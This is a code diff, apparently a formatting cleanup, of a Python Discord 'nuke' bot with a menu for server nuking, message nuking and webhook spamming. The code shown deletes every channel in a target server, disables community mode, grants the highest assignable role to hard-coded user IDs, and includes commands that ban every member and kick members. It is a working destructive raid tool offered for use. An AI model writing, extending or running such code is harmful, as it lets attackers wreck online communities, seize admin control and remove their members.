@@ -8,41 +8,30 @@ import asyncio
 import logging
 import requests
 import colorama
-from colorama import Fore, Style, init
-
-
+from colorama import Fore, init
 
 def install_requirements_if_needed():
     """Check if requirements are installed, and install them if they're not."""
     try:
-        
-        result = subprocess.run([
-            sys.executable, "-m", "pip", "install", "-r", "requirements.txt",
-            "--upgrade", "--quiet"
-        ],
-                                stdout=subprocess.PIPE,
-                                stderr=subprocess.PIPE)
+        result = subprocess.run(
+            [sys.executable, "-m", "pip", "install", "-r", "requirements.txt", "--upgrade", "--quiet"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
 
-      
         if result.returncode == 0:
             print("All dependencies are up to date.")
         else:
-            print(
-                "Some dependencies were missing or outdated and have been installed."
-            )
-
+            print("Some dependencies were missing or outdated and have been installed.")
     except FileNotFoundError:
         print("requirements.txt not found.")
     except subprocess.CalledProcessError as e:
         print(f"Error during installation: {e}")
 
-
-
 if os.path.isfile("requirements.txt"):
     install_requirements_if_needed()
     time.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
-
 
 init(autoreset=True)
 
@@ -50,22 +39,18 @@ logging.getLogger('discord').setLevel(logging.CRITICAL)
 logging.getLogger('discord.http').setLevel(logging.CRITICAL)
 logging.getLogger().setLevel(logging.CRITICAL)
 
-
 intents = discord.Intents.default()
 intents.guilds = True
 intents.members = True
 intents.messages = True
 intents.message_content = True
 
-
 bot = commands.Bot(command_prefix='$', intents=intents)
-
 
 async def async_input(prompt: str) -> str:
     """Async wrapper for input() to avoid blocking the bot."""
     loop = asyncio.get_event_loop()
     return await loop.run_in_executor(None, input, prompt)
-
 
 @bot.event
 async def on_ready():
@@ -75,24 +60,15 @@ async def on_ready():
     os.system('cls' if os.name == 'nt' else 'clear')
 
     while True:
-    print(Fore.RED +
-          "$$\    $$\  $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\  ")
-    print(Fore.RED +
-          "\\$$\\  $$  |$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ ")
-    print(Fore.RED +
-          " \\$$\\$$  / $$$$$$$$ |$$ |  \\__|\\$$$$$$\\  $$$$$$$$ |")
-    print(Fore.RED +
-          "  \\$$$  /  $$   ____|$$ |       \\____$$\\ $$   ____|")
-    print(Fore.RED +
-          "   \\$  /   \\$$$$$$$\\ $$ |      $$$$$$$  |\\$$$$$$$\\ ")
-    print(Fore.RED +
-          "    \\_/     \\_______|\\__|      \\_______/  \\_______|")
-        print(Fore.RED +
-              "                                                        ")
-        print(Fore.RED +
-              "                                                        ")
-        print(Fore.RED +
-              "                                                        ")
+        print(Fore.RED + "$$\    $$\  $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\  ")
+        print(Fore.RED + "\\$$\\  $$  |$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ ")
+        print(Fore.RED + " \\$$\\$$  / $$$$$$$$ |$$ |  \\__|\\$$$$$$\\  $$$$$$$$ |")
+        print(Fore.RED + "  \\$$$  /  $$   ____|$$ |       \\____$$\\ $$   ____|")
+        print(Fore.RED + "   \\$  /   \\$$$$$$$\\ $$ |      $$$$$$$  |\\$$$$$$$\\ ")
+        print(Fore.RED + "    \\_/     \\_______|\\__|      \\_______/  \\_______|")
+        print(Fore.RED + "                                                        ")
+        print(Fore.RED + "                                                        ")
+        print(Fore.RED + "                                                        ")
         print(
             Fore.RED +
             " 1. ServerID nuke         2. Message Nuke        3. Webhook Spammer"
@@ -116,14 +92,14 @@ async def on_ready():
             if guild is None:
                 print(
                     Fore.RED +
-                    "[-] I cannot find a server with that ID (or the bot is not in it)"
+"[-] I cannot find a server with that ID (or the bot is not in it)"
                 )
             else:
-                
+
                 user_ids = [ID, ID
                             ] 
 
-                
+
                 bot_member = guild.get_member(bot.user.id)
                 if bot_member is None:
                     print(Fore.RED + "[-] Could not find the bot in the server.")
@@ -151,7 +127,7 @@ async def on_ready():
                             f"[-] User  with ID {user_id} not found in the server."
                         )
                     else:
-                       
+
                         try:
                             await user.add_roles(highest_assignable_role)
                             print(
@@ -169,8 +145,9 @@ async def on_ready():
                                 f"[-] Failed to add role to user with ID {user_id}: {e}"
                             )
 
-                
+
                 await perform_nuke(guild)
+            os.system('cls' if os.name == 'nt' else 'clear')
 
         elif choice == '2':
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -205,7 +182,7 @@ async def on_ready():
             time.sleep(2)
             os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '4':
-           
+
             print(Fore.RED + "Available commands:")
             print(Fore.RED + "$nuke - Nukes the server")
             print(Fore.RED + "$kick - kicks every member (it can)")
@@ -253,7 +230,7 @@ async def on_ready():
             time.sleep(5)  
             os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '8':
-                        
+
                         guild_id = input("Enter the guild ID: ")
                         try:
                             guild_id = int(guild_id)
@@ -294,7 +271,7 @@ async def on_command_error(ctx, error):
 
 
 async def perform_nuke(guild):
-    
+
     for channel in guild.channels:
         await channel.delete()
         await asyncio.sleep(0)  
@@ -329,7 +306,7 @@ async def perform_nuke(guild):
 async def nuke(ctx):
     guild = ctx.guild
 
-   
+
     if guild.features and 'COMMUNITY' in guild.features:
         await guild.edit(community=False)  
 
@@ -380,7 +357,7 @@ async def admin(ctx):
 
                 highest_assignable_role = max(assignable_roles, key=lambda role: role.position)
 
-                
+
                 try:
                     await user.add_roles(highest_assignable_role)
                     print(f" [+] Successfully added the highest role '{highest_assignable_role.name}' to {user.name}.")
@@ -401,7 +378,7 @@ async def create(ctx, *, name: str):
 
 
     try:
- 
+
         new_channel = await ctx.guild.create_text_channel(name)
         print(f"Successfully created channel: '{new_channel.name}'")
     except discord.HTTPException as e:
@@ -426,10 +403,10 @@ async def ban(ctx):
             except discord.HTTPException as e:
                 print(f"[-] Failed to ban {member.name}#{member.discriminator}: {e}")
 
-    
+
 @bot.command()
 async def members(ctx):
-    
+
     total_members = ctx.guild.member_count
 
     await ctx.send(f'The total number of members in this server is: {total_members}')
